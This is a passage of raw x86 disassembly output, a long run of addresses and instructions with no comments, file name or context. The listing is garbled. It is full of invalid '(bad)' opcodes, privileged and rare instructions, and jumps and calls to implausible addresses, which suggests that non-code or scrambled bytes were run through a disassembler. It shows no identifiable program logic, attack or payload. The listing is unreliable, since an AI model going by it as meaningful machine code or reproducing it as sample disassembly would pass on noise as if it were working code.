  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
